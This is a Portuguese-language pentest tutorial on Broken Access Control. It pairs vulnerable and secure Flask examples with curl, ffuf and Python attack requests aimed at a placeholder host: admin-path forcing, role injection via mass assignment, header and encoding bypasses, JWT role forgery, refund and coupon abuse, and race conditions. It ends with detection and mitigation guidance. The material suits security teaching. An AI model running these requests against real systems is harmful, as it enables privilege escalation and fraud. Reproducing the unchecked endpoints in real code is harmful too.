---
title: "Broken Access Control"
---

# Broken Access Control

## A Falha: Funções Privilegiadas Acessíveis a Usuários Não Autorizados

Broken Access Control (BAC) ocorre quando o controle de acesso é implementado no lugar errado ou de forma incompleta. A manifestação mais comum: **o frontend esconde a interface de admin, mas o endpoint de backend não verifica se quem está chamando tem autorização para aquela função**.

A suposição incorreta de design é: "se o usuário não vê o botão, ele não vai chamar a função". A realidade é que qualquer um com Burp Suite pode chamar diretamente a URL do endpoint, sem precisar que a interface mostre o botão.

**Perspectiva do desenvolvedor — três padrões que criam BAC**:

**1. Controle de acesso no frontend**: o desenvolvedor esconde o botão "Deletar Usuário" para usuários não-admin. O endpoint `DELETE /api/admin/users/{id}` existe e responde a qualquer requisição autenticada. Um exemplo concreto: o endpoint retorna 403 para `DELETE /api/v2/user/videos/52`, mas quando o caminho é alterado para `DELETE /api/v2/admin/videos/52`, o vídeo é deletado com sucesso — a função administrativa está acessível sem verificação de autorização no backend.

**2. Mass Assignment — aceitar campos não autorizados**: o endpoint `PUT /api/profile` aceita o corpo da requisição e o salva no banco sem filtrar. Se o schema do objeto inclui um campo `role`, e o usuário manda `{"role": "admin"}`, o banco é atualizado. O desenvolvedor não pensou que o usuário mandaria campos além dos mostrados no formulário.

**3. Acesso irrestrito a fluxos de negócio**: validações de negócio são implementadas na sequência esperada do fluxo, mas o atacante chama endpoints fora de ordem ou com parâmetros que não deveriam ser aceitos. Um exemplo: o endpoint de devolução de pedido aceita o campo `quantity` no corpo — o usuário devolve "1000 unidades" de um pedido de 1 unidade, recebendo 10.000 dólares de crédito.

**Impacto real**: usuários comuns acessam funções administrativas (deletar qualquer conteúdo, exportar dados de todos os usuários), escalam privilégios, contornam restrições de negócio (preços, quantidades, cupons), violações de compliance.

---

## Causa Raiz

### Padrão 1: Controle de Acesso Apenas no Frontend

```javascript
// React — esconder botao para nao-admin (frontend)
function AdminPanel({ user }) {
    return (
        <div>
            {user.isAdmin && (
                <button onClick={() => deleteUser(selectedUserId)}>
                    Deletar Usuário
                </button>
            )}
        </div>
    );
}
// O botao some para usuario comum. Mas o endpoint existe.
```

```python
# Backend VULNERAVEL: sem verificacao de autorizacao
@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
def delete_user(user_id):
    # Verifica apenas se esta autenticado (middleware)
    # NAO verifica se e admin
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return jsonify({"success": True})
```

```python
# Backend SEGURO: verificacao no servidor
@app.route('/api/admin/users/<int:user_id>', methods=['DELETE'])
@login_required
@require_role('admin')  # verificacao server-side, nao confiar no frontend
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return jsonify({"success": True})
```

### Padrão 2: Mass Assignment

```python
# VULNERAVEL: aceitar body completo sem filtrar campos
@app.route('/api/profile', methods=['PUT'])
@login_required
def update_profile():
    data = request.json
    # Aceita qualquer campo que venha no body
    User.query.filter_by(id=current_user.id).update(data)
    db.session.commit()
    # Se data = {"role": "admin"} → usuario virou admin
```

```python
# SEGURO: whitelist explícita de campos aceitos
@app.route('/api/profile', methods=['PUT'])
@login_required
def update_profile():
    data = request.json
    # Apenas campos que o usuario tem permissao de alterar
    allowed_fields = {'name', 'bio', 'avatar_url'}
    safe_data = {k: v for k, v in data.items() if k in allowed_fields}
    
    User.query.filter_by(id=current_user.id).update(safe_data)
    db.session.commit()
```

### Padrão 3: Fluxo de Negócio Sem Validação de Valores

```python
# VULNERAVEL: aceitar quantity sem validar contra pedido original
@app.route('/api/orders/<int:order_id>/return', methods=['PUT'])
@login_required
def return_order(order_id):
    data = request.json
    order = Order.query.get(order_id)
    
    # Usa quantity do body sem verificar contra quantity do pedido original
    refund_amount = order.price * data.get('quantity', order.quantity)
    current_user.balance += refund_amount
    order.status = 'returned'
    db.session.commit()
    # Se data = {"quantity": 1000} e preco = 10 → reembolso de 10.000
```

```python
# SEGURO: validar quantity contra pedido original
@app.route('/api/orders/<int:order_id>/return', methods=['PUT'])
@login_required
def return_order(order_id):
    order = Order.query.get(order_id)
    
    if order.user_id != current_user.id:
        abort(403)
    
    # Usar quantity do pedido original, nao do body
    refund_amount = order.price * order.quantity
    current_user.balance += refund_amount
    order.status = 'returned'
    db.session.commit()
```

---

## Como o Ataque Funciona

### Categorias de Broken Access Control

| Categoria | Descrição |
|-----------|-----------|
| IDOR | Acesso direto a objeto por ID |
| Elevação de privilégio vertical | Usuário comum acessa função de admin |
| Elevação de privilégio horizontal | Usuário A acessa recursos de usuário B |
| Bypass de restrição de negócio | Contornar limites (ex: cupom de desconto infinito) |
| Funcionalidade exposta mas não linkada | Endpoint admin acessível sem link na UI |
| Forceful Browsing | Acessar diretamente URLs sem navegar pelo fluxo |
| Manipulação de parâmetros de controle | Mudar `role=user` para `role=admin` no request |

### Modelos de Controle de Acesso

| Modelo | Descrição |
|--------|-----------|
| DAC (Discretionary) | Dono define quem acessa (Linux file permissions) |
| MAC (Mandatory) | Política central define acesso (SELinux) |
| RBAC (Role-Based) | Acesso baseado em papel/função |
| ABAC (Attribute-Based) | Acesso baseado em atributos contextuais |

---

## Discovery / Identificação

### Mapeamento de Funcionalidades

```bash
# Identificar todos os endpoints da aplicacao
# Navegar como usuario comum → registrar todos os requests no Burp

# Verificar Site Map no Burp
# Filtrar por: status 200, 302, mas tambem 401, 403

# ffuf para descobrir endpoints nao linkados
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://alvo.com/FUZZ" \
     -mc 200,301,302,401,403

# Buscar especificamente por endpoints admin
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://alvo.com/admin/FUZZ" \
     -mc 200,301,302

# Wordlists especificas para API
ffuf -w /opt/useful/seclists/Discovery/Web-Content/api/api-endpoints.txt:FUZZ \
     -u "http://alvo.com/api/FUZZ" \
     -H "Cookie: session=SESSAO_USER_NORMAL" \
     -mc 200,201
```

### Comparar Privilégios — Duas Contas

**Técnica essencial**: criar duas contas (admin e user), interceptar todos os requests com a sessão admin, e testar cada um com a sessão user.

```bash
# Passo 1: Login como admin, capturar todos requests no Burp
ADMIN_SESSION="admin_session_token"
USER_SESSION="user_session_token"

# Passo 2: Testar cada endpoint admin com sessao de usuario
ENDPOINTS=(
    "/admin/users"
    "/admin/settings"
    "/admin/export"
    "/api/admin/logs"
    "/api/users/all"
    "/dashboard/reports"
)

for ep in "${ENDPOINTS[@]}"; do
    echo -n "Testing $ep: "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             "http://alvo.com$ep" \
             -H "Cookie: session=$USER_SESSION")
    echo "HTTP $STATUS"
done
```

**Testar variações de path**: trocar `user` por `admin` no caminho da URL pode revelar endpoints administrativos:

```bash
# Endpoint normal: /api/v2/user/videos/52
# Endpoint admin:  /api/v2/admin/videos/52

# Testar a versao admin com sessao de usuario normal
curl -s -X DELETE "http://alvo.com/api/v2/admin/videos/52" \
     -H "Cookie: session=USER_SESSION"
```

---

## Exploitation

### 1. Forceful Browsing — Acesso Direto a URLs

```bash
# Endpoints admin comuns — testar com sessao de usuario normal
ADMIN_URLS=(
    "/admin"
    "/admin/dashboard"
    "/admin/users"
    "/admin/settings"
    "/admin/logs"
    "/admin/reports"
    "/admin/config"
    "/superadmin"
    "/management"
    "/backend"
    "/console"
    "/panel"
    "/wp-admin"
    "/administrator"
)

SESSION="USER_SESSION_TOKEN"

for url in "${ADMIN_URLS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             "http://alvo.com$url" \
             -H "Cookie: session=$SESSION")
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "302" ]; then
        echo "[+] ACESSIVEL: $url (HTTP $STATUS)"
    fi
done
```

### 2. Manipulação de Parâmetros de Papel (Role)

```bash
# Request original do usuario normal
POST /api/profile HTTP/1.1
Cookie: session=USER_SESSION
{"name": "Test User", "email": "test@example.com"}

# Tentativa de adicionar/modificar campo de role
curl -s -X POST "http://alvo.com/api/profile" \
     -H "Cookie: session=USER_SESSION" \
     -H "Content-Type: application/json" \
     -d '{"name": "Test User", "email": "test@example.com", "role": "admin"}'

# Verificar se role mudou
curl -s "http://alvo.com/api/profile" \
     -H "Cookie: session=USER_SESSION" | jq '.role'
```

**Campos comuns para tentar injetar (mass assignment)**:
```json
{
  "role": "admin",
  "isAdmin": true,
  "admin": 1,
  "userType": "administrator",
  "privilege": "high",
  "accessLevel": 99,
  "group": "admins",
  "permissions": ["read", "write", "admin"]
}
```

### 3. Elevação de Privilégio via Header HTTP

```bash
# Muitos sistemas legados verificam acesso via headers
curl -s "http://alvo.com/admin" \
     -H "Cookie: session=USER_SESSION" \
     -H "X-Admin: true"

curl -s "http://alvo.com/admin" \
     -H "Cookie: session=USER_SESSION" \
     -H "X-Role: admin"

curl -s "http://alvo.com/admin" \
     -H "Cookie: session=USER_SESSION" \
     -H "X-User-Type: administrator"

# Ou via parametro na URL
curl -s "http://alvo.com/admin?admin=true" \
     -H "Cookie: session=USER_SESSION"

curl -s "http://alvo.com/admin?debug=1" \
     -H "Cookie: session=USER_SESSION"
```

### 4. Bypass de Controle de Acesso por HTTP Method

```bash
# Endpoint que verifica autorizacao apenas no GET
# Mas o POST nao verifica

# Testar todos os metodos HTTP
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -X $method "http://alvo.com/admin/users" \
             -H "Cookie: session=USER_SESSION")
    echo "$method: HTTP $STATUS"
done

# Exemplo de bypass via POST quando GET retorna 403
curl -s -X POST "http://alvo.com/admin/delete_user?id=1234" \
     -H "Cookie: session=USER_SESSION"
```

### 5. Bypass via URL Alternativa / Path Confusion

```bash
# Encoding de URL pode bypassar controles
# /admin → 403
# /%61dmin → 200? (a = %61)

curl -s "http://alvo.com/%61dmin" -H "Cookie: session=USER_SESSION"
curl -s "http://alvo.com/Admin" -H "Cookie: session=USER_SESSION"
curl -s "http://alvo.com/ADMIN" -H "Cookie: session=USER_SESSION"
curl -s "http://alvo.com/admin/" -H "Cookie: session=USER_SESSION"
curl -s "http://alvo.com//admin" -H "Cookie: session=USER_SESSION"
curl -s "http://alvo.com/./admin" -H "Cookie: session=USER_SESSION"
curl -s "http://alvo.com/api/../admin" -H "Cookie: session=USER_SESSION"
```

### 6. Contorno de Restrições de Negócio

O endpoint de devolução não valida a quantidade contra o pedido original, permitindo devolver "1000 unidades" de um pedido de 1 unidade.

```bash
# Cupom de desconto de uso unico — tentar reuso
curl -s -X POST "http://alvo.com/checkout" \
     -H "Cookie: session=USER_SESSION" \
     -d "coupon=SAVE50&order_id=9999"

# Limite de quantidade — enviar valor negativo ou zero
curl -s -X POST "http://alvo.com/api/order" \
     -H "Cookie: session=USER_SESSION" \
     -H "Content-Type: application/json" \
     -d '{"item_id": 1, "quantity": -1}'

# Preco manipulado — modificar preco no checkout
curl -s -X POST "http://alvo.com/api/checkout" \
     -H "Cookie: session=USER_SESSION" \
     -H "Content-Type: application/json" \
     -d '{"item_id": 1, "price": 0.01, "quantity": 1}'

# Quantidade inflada na devolucao
curl -s -X PUT "http://alvo.com/api/orders/10/return" \
     -H "Cookie: session=USER_SESSION" \
     -H "Content-Type: application/json" \
     -d '{"status": "returned", "quantity": 1000}'

# Race condition para usar cupom duas vezes simultaneamente
for i in {1..10}; do
    curl -s -X POST "http://alvo.com/apply_coupon" \
         -d "coupon=ONCE&user_id=1234" &
done
wait
```

### 7. Privilégio via Manipulação de Token

```bash
# JWT com claim de role
# Decodificar token atual
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.XXXXX"

# Decodificar payload
echo "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9" | base64 -d
# {"user":"admin","role":"user"}

# Construir novo payload com role=admin
echo -n '{"user":"admin","role":"admin"}' | base64
# eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==

# Substituir o payload no JWT (assinatura invalida — testar se verificada)
NEW_TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.XXXXX"
curl -s "http://alvo.com/admin" \
     -H "Authorization: Bearer $NEW_TOKEN"
```

### 8. Acesso a Funcionalidades via API Direta

```bash
# A UI esconde o botao de admin mas a API pode estar exposta
# Descobrir via analise do codigo JavaScript

# Buscar endpoints em JS
curl -s "http://alvo.com/app.js" | grep -oE "\"/(api|admin)[^\"]*\""

# Ou via developer tools → Network → filtrar XHR

# Testar endpoint descoberto diretamente
curl -s -X DELETE "http://alvo.com/api/admin/users/1235" \
     -H "Cookie: session=USER_SESSION"

curl -s -X GET "http://alvo.com/api/admin/export/all_users.csv" \
     -H "Cookie: session=USER_SESSION"
```

### 9. Multi-Step Process Bypass

Aplicações com fluxos multi-etapa frequentemente verificam autorização apenas na primeira etapa:

```bash
# Fluxo normal: /step1 → /step2 → /step3/complete

# Pular diretamente para step3
curl -s -X POST "http://alvo.com/checkout/complete" \
     -H "Cookie: session=USER_SESSION" \
     -d "order_id=1234&payment_confirmed=true"

# Ou comecar como admin e continuar como user
# (verificacao so no inicio do fluxo)
```

---

## Automação

### Burp Suite — Authorize Extension

```
Instalar: BApp Store → Authorize
Configuracao:
1. Fazer login como admin → capturar token → colar em "Header(s) of the low privileged user"
2. Fazer login como user → navegar pela aplicacao normalmente
3. Authorize automaticamente repete cada request com a sessao de user
4. Analisa diferenca nas respostas — destaca possiveis BAC
```

### Script Python para Teste de BAC

```python
import requests

ADMIN_SESSION = "admin_session_token"
USER_SESSION = "user_session_token"
BASE_URL = "http://alvo.com"

# Endpoints a testar
endpoints = [
    ("GET", "/admin/users", None),
    ("GET", "/admin/settings", None),
    ("POST", "/api/admin/delete_user", {"user_id": 1235}),
    ("GET", "/api/admin/export", None),
    ("PUT", "/api/users/1235/role", {"role": "admin"}),
    ("GET", "/api/logs/all", None),
]

print("=" * 60)
print(f"{'Endpoint':<40} {'Admin':<10} {'User':<10}")
print("=" * 60)

for method, path, body in endpoints:
    # Request como admin
    admin_r = requests.request(
        method, f"{BASE_URL}{path}",
        cookies={"session": ADMIN_SESSION},
        json=body,
        timeout=10
    )
    
    # Request como user
    user_r = requests.request(
        method, f"{BASE_URL}{path}",
        cookies={"session": USER_SESSION},
        json=body,
        timeout=10
    )
    
    vuln = ""
    if user_r.status_code == admin_r.status_code:
        vuln = "  <- POSSIVEL BAC!"
    
    print(f"{method} {path:<36} {admin_r.status_code:<10} {user_r.status_code:<10}{vuln}")
```

### ffuf com Duas Sessões

```bash
# Descobrir endpoints admin
ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
     -u "http://alvo.com/admin/FUZZ" \
     -H "Cookie: session=USER_SESSION" \
     -mc 200,301,302 \
     -o admin_access.json \
     -of json
```

---

## Casos Específicos

### BAC em APIs REST

```bash
# Testar DELETE em recurso de outro usuario
curl -s -X DELETE "http://alvo.com/api/posts/1235" \
     -H "Cookie: session=USER_SESSION"

# Testar acesso a recurso via nested route
# /api/users/1/orders → /api/users/2/orders com sessao do user 1
curl -s "http://alvo.com/api/users/2/orders" \
     -H "Cookie: session=USER_1_SESSION"

# Testar escopo de API key
curl -s "http://alvo.com/api/admin/data" \
     -H "X-API-Key: USER_API_KEY"
```

### BAC em GraphQL

```graphql
# Query que deveria ser restrita a admins
query {
    allUsers {
        id
        email
        password_hash
        role
        credit_card
    }
}

# Mutation privilegiada
mutation {
    updateUserRole(userId: "1235", role: "admin") {
        success
    }
}
```

### BAC em WebSocket

```bash
# Usando wscat para testar
wscat -c "ws://alvo.com/ws" \
      -H "Cookie: session=USER_SESSION"

# Enviar mensagem para canal restrito
{"action": "admin_broadcast", "message": "test"}
{"action": "get_all_users"}
```

---

## Detecção e Mitigação

### Análise de Logs

```bash
# Detectar usuarios comuns acessando endpoints admin
grep "GET /admin\|POST /admin" /var/log/apache2/access.log \
  | grep -v "200 -" | awk '{print $1, $7, $9}'

# Detectar tentativas de manipulacao de role
grep "role.*admin\|isAdmin.*true\|admin.*true" /var/log/apache2/access.log

# Monitorar IDs acessados por usuario
grep "api/user" /var/log/apache2/access.log \
  | awk '{print $1, $7}' | sort | uniq -c | sort -rn
```

### Implementação Correta

```python
# Python/Flask — verificacao de autorizacao centralizada
from functools import wraps
from flask import session, abort

def require_role(*roles):
    """Decorator para verificar papel do usuario"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            user_id = session.get('user_id')
            if not user_id:
                abort(401)
            user = User.query.get(user_id)
            if user.role not in roles:
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Uso
@app.route('/admin/users')
@require_role('admin', 'superadmin')
def admin_users():
    return User.query.all()

@app.route('/api/user/<int:user_id>')
@require_role('admin', 'user')
def get_user(user_id):
    current_user_id = session.get('user_id')
    # Verificar acesso ao recurso especifico
    if current_user_id != user_id and not current_user.is_admin:
        abort(403)
    return User.query.get_or_404(user_id)
```

**Princípio do Menor Privilégio** — regras fundamentais:
```
1. Deny by default — negar tudo, permitir apenas o necessario
2. Verificacao server-side — NUNCA confiar no client (botao escondido nao e controle)
3. Verificacao em CADA request — nao apenas no login ou na primeira chamada do fluxo
4. Verificar tanto FUNCAO (pode chamar este endpoint?) quanto OBJETO (pode acessar este ID?)
5. Whitelist de campos em mass assignment — nao aceitar campos nao esperados
6. Validar parametros de negocio no servidor — quantity, price, status nao podem ser manipulados pelo cliente
7. Logs de auditoria — registrar acessos a funcoes sensiveis com user_id e timestamp
8. Testes automatizados de controle de acesso em CI/CD
```

---

## Cheatsheet Rápido

| Ataque | Técnica |
|--------|---------|
| Forceful browsing | Acessar /admin/* com sessão de user |
| Role injection | Adicionar `"role": "admin"` no body |
| Header bypass | `X-Admin: true`, `X-Role: admin` |
| Method bypass | GET proibido → tentar POST |
| URL encoding | `/admin` → `/%61dmin` |
| JWT role | Modificar claim `role` no payload |
| API direta | Descobrir em JS e chamar sem UI |
| Multi-step skip | Pular para última etapa do fluxo |
| Param negativo | `quantity: -1`, `price: 0.01` |
| Race condition | Parallel requests para contornar limite |
| Path swap | Trocar `user` por `admin` no caminho da URL |
| Mass assignment | Enviar campos extras (`role`, `isAdmin`) no body |
| Quantity inflation | Alterar quantidade na devolução para valor absurdo |

---

## Módulos Relacionados

IDOR (`01_idor.md`) é uma subcategoria de BAC que foca especificamente em acesso a objetos por ID; este módulo cobre o espectro mais amplo de acesso a funções, bypass de restrições de negócio e mass assignment. JWT Attacks (`../07_autenticacao/02_jwt_attacks.md`) é diretamente relevante porque claims de role no JWT são o alvo de privilege escalation — forjar `role: admin` no payload de um JWT é essencialmente um BAC realizado via manipulação de token. Comprometer uma conta privilegiada via brute force, coberto em Broken Auth (`../07_autenticacao/01_brute_force_e_broken_auth.md`), é um vetor alternativo para BAC quando o controle de acesso em si está corretamente implementado.
